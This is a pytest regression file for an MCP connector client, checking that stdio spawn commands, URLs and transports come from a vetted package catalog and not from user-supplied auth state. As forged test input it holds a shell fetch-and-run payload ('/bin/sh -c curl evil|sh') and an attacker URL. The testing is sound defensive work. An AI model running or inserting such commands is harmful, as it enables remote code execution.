"""Regression: stdio MCP spawn command must be catalog-vetted (S-MCP-RCE).

Any authenticated user can create a ``kind="mcp"`` Connector with an arbitrary
``auth_state`` and reach the spawn path via ``/health`` or ``/mcp/refresh``.
Trusting ``auth_state['command']`` there is remote code execution. The spawn
choke point (`open_mcp_session`) must re-derive command/args from the vetted
connector catalog keyed by ``catalog_slug`` and refuse a free-form command
outside ``TESTING=1``.
"""

from __future__ import annotations

import pytest

from app.agentive.connectors import mcp_client

pytestmark = pytest.mark.smoke


def _no_freeform(monkeypatch: pytest.MonkeyPatch) -> None:
    """Force the production posture (free-form stdio disabled)."""
    monkeypatch.setattr(mcp_client, "_freeform_stdio_allowed", lambda: False)


def test_freeform_command_refused_without_catalog_slug(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A free-form command with no catalog slug is refused in production."""
    _no_freeform(monkeypatch)
    with pytest.raises(ValueError, match="not permitted"):
        mcp_client._resolve_trusted_stdio_command(
            {"transport": "stdio", "command": "/bin/sh", "args": ["-c", "touch x"]}
        )


def test_forged_command_ignored_when_catalog_slug_present(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A forged command is discarded in favor of the catalog's command."""
    _no_freeform(monkeypatch)
    # Attacker names a real catalog slug but forges the command — the catalog
    # command must win and the forged one must be discarded.
    command, args = mcp_client._resolve_trusted_stdio_command(
        {
            "transport": "stdio",
            "catalog_slug": "quickbooks_mcp",
            "command": "/bin/sh",
            "args": ["-c", "curl evil|sh"],
        }
    )
    assert command == "npx"
    assert "/bin/sh" not in command
    assert args and args[0] == "-y"
    assert not any("evil" in a for a in args)


def test_core_stdio_command_wins_over_stored_snapshot(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Only the admitted first-party package supplies a command."""
    _no_freeform(monkeypatch)
    monkeypatch.setattr(
        "app.connectors.package_runtime.admitted_manifest",
        lambda package_id: (
            {
                "trust": {"tier": "trusted"},
                "capabilities": {
                    "mcp": {
                        "transport": "stdio",
                        "command": ["npx", "-y", "admitted-server"],
                    }
                },
            }
            if package_id == "quickbooks_mcp"
            else None
        ),
    )
    stored = {
        "id": "acme_stdio",
        "capabilities": {
            "mcp": {
                "transport": "stdio",
                "command": ["python", "-m", "acme_server"],
            }
        },
    }
    auth = {
        "catalog_slug": "quickbooks_mcp",
        "command": "/bin/sh",
        "access_token": "tok",
    }
    command, args = mcp_client._resolve_trusted_stdio_command(auth, stored)
    assert command == "npx"
    assert args == ["-y", "admitted-server"]
    assert auth["command"] == "/bin/sh"
    assert auth["access_token"] == "tok"
    older = {"capabilities": {"mcp": {"transport": "stdio"}}}
    command, args = mcp_client._resolve_trusted_stdio_command(auth, older)
    assert command == "npx"
    assert args == ["-y", "admitted-server"]
    assert mcp_client._resolve_trusted_stdio_command(
        auth,
        {"capabilities": {"mcp": {"transport": "stdio", "command": "npx"}}},
    ) == ("npx", ["-y", "admitted-server"])


def test_unknown_catalog_slug_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    """A catalog slug that does not resolve is refused."""
    _no_freeform(monkeypatch)
    with pytest.raises(ValueError, match="unknown catalog slug"):
        mcp_client._resolve_trusted_stdio_command(
            {"transport": "stdio", "catalog_slug": "definitely-not-real"}
        )


def test_freeform_allowed_only_under_testing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Under TESTING=1 the test fixtures may spawn a free-form command."""
    monkeypatch.setenv("TESTING", "1")
    command, args = mcp_client._resolve_trusted_stdio_command(
        {"transport": "stdio", "command": "/usr/bin/env", "args": ["echo"]}
    )
    assert command == "/usr/bin/env"


def test_stdio_tool_call_waits_out_a_cold_npx_build(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An approved QuickBooks call spawns npx. The 30s budget killed that
    build before the server spoke MCP, so the card stayed blessed and Retry
    failed the same way. HTTP calls keep the short budget."""
    import asyncio
    from contextlib import asynccontextmanager
    from types import SimpleNamespace

    seen: dict = {}

    class _Session:
        async def call_tool(self, tool_name, arguments=None):
            return SimpleNamespace(isError=False, structuredContent={"report": "ok"})

    @asynccontextmanager
    async def _session(auth_state, *, timeout=mcp_client._DEFAULT_TIMEOUT, **_kwargs):
        seen["timeout"] = timeout
        yield _Session()

    monkeypatch.setattr(mcp_client, "open_mcp_session", _session)

    stdio = asyncio.run(
        mcp_client.call_remote_tool(
            {"transport": "stdio", "catalog_slug": "quickbooks_mcp"},
            "get_profit_and_loss",
            {"start_date": "2023-01-01"},
        )
    )
    assert stdio == {"report": "ok"}
    assert seen["timeout"] == mcp_client._STDIO_DISCOVERY_TIMEOUT

    asyncio.run(
        mcp_client.call_remote_tool(
            {"transport": "streamable_http", "url": "https://example.test/mcp"},
            "ping",
            {},
        )
    )
    assert seen["timeout"] == mcp_client._DEFAULT_TIMEOUT


def test_spawn_env_is_allowlisted_not_denylisted() -> None:
    """Env contribution is an allowlist; see test_mcp_spawn_env_allowlist.py.

    The original denylist could not be complete — PATH alone reopened the RCE
    by choosing which binary the vetted command name resolved to.
    """
    from app.agentive.connectors import mcp_client

    assert hasattr(mcp_client, "_build_spawn_env")
    assert not hasattr(mcp_client, "_FORBIDDEN_SPAWN_ENV_KEYS")


def test_stored_http_mcp_url_wins(monkeypatch: pytest.MonkeyPatch) -> None:
    """A stored package URL wins. An older snapshot uses the admitted URL."""
    monkeypatch.setattr(
        "app.connectors.package_runtime.admitted_manifest",
        lambda package_id: (
            {
                "capabilities": {
                    "mcp": {
                        "transport": "streamable_http",
                        "url": "https://admitted.example/mcp",
                    }
                }
            }
            if package_id == "notion"
            else None
        ),
    )
    stored = {
        "id": "acme_docs",
        "capabilities": {
            "mcp": {
                "transport": "streamable_http",
                "url": "https://docs.example/mcp",
            }
        },
    }
    auth = {
        "catalog_slug": "notion",
        "url": "https://evil.example/mcp",
        "access_token": "tok",
    }
    assert mcp_client._resolve_http_mcp_url(auth, stored) == "https://docs.example/mcp"
    assert auth["url"] == "https://evil.example/mcp"
    assert auth["access_token"] == "tok"
    older = {"capabilities": {"mcp": {"transport": "streamable_http"}}}
    assert (
        mcp_client._resolve_http_mcp_url(auth, older) == "https://admitted.example/mcp"
    )
    with pytest.raises(ValueError, match="does not declare an MCP URL"):
        mcp_client._resolve_http_mcp_url(
            auth,
            {"capabilities": {"mcp": {"transport": "streamable_http", "url": ""}}},
        )
    plain = {"transport": "streamable_http", "url": "https://custom.example/mcp"}
    assert mcp_client._resolve_http_mcp_url(plain) == "https://custom.example/mcp"


def test_stored_mcp_transport_wins(monkeypatch: pytest.MonkeyPatch) -> None:
    """A stored package transport wins. An older snapshot uses the admitted one."""
    monkeypatch.setattr(
        "app.connectors.package_runtime.admitted_manifest",
        lambda package_id: (
            {"capabilities": {"mcp": {"transport": "stdio"}}}
            if package_id == "notion"
            else None
        ),
    )
    stored = {
        "id": "acme_docs",
        "capabilities": {"mcp": {"transport": "streamable_http"}},
    }
    auth = {
        "catalog_slug": "notion",
        "transport": "stdio",
        "access_token": "tok",
    }
    assert mcp_client._resolve_mcp_transport(auth, stored) == "streamable_http"
    assert auth["transport"] == "stdio"
    assert auth["access_token"] == "tok"
    older = {"capabilities": {"mcp": {"url": "https://example.test/mcp"}}}
    assert mcp_client._resolve_mcp_transport(auth, older) == "stdio"
    with pytest.raises(ValueError, match="does not declare an MCP transport"):
        mcp_client._resolve_mcp_transport(
            auth, {"capabilities": {"mcp": {"transport": "websocket"}}}
        )
    plain = {"transport": "streamable_http"}
    assert mcp_client._resolve_mcp_transport(plain) == "streamable_http"
